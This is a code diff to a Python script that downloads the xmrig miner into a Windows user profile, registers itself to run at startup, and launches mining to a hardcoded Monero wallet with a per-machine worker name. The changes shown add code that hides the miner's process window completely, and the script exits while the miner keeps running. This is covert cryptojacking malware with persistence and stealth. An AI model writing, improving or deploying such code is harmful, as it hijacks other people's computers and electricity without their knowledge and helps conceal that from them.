@@ -66,7 +66,7 @@ def check_and_download_xmrig(userprofile):
     else:
         print("xmrig.exe already exists in the userprofile directory.")
 
-# Function to run xmrig.exe with the specified parameters in background mode (no window)
+# Function to run xmrig.exe with the specified parameters in background (hidden window)
 def run_xmrig(userprofile):
     xmrig_path = os.path.join(userprofile, "xmrig.exe")
     if not os.path.exists(xmrig_path):
@@ -92,10 +92,13 @@ def run_xmrig(userprofile):
         "-u", f"47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP.{unique_name}",
         "--donate-level", "0"
     ]
+    # Create a STARTUPINFO object to hide the process window completely.
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    si.wShowWindow = subprocess.SW_HIDE
     try:
-        # Use CREATE_NO_WINDOW so that no console window is shown
-        subprocess.Popen(cmd, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
-        print("xmrig.exe has been started with the specified parameters.")
+        subprocess.Popen(cmd, shell=False, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
+        print("xmrig.exe has been started with the specified parameters hidden.")
     except Exception as e:
         print("Error starting xmrig.exe:", e)
 
@@ -147,8 +150,7 @@ if __name__ == "__main__":
             add_to_startup(sys.argv[0])
         else:
             print("Startup registry entry already exists.")
-        # Step 4: Run xmrig.exe in background (no window)
+        # Step 4: Run xmrig.exe in background (hidden window)
         run_xmrig(userprofile)
         # Step 5: Exit current script (xmrig continues running)
         sys.exit()
-
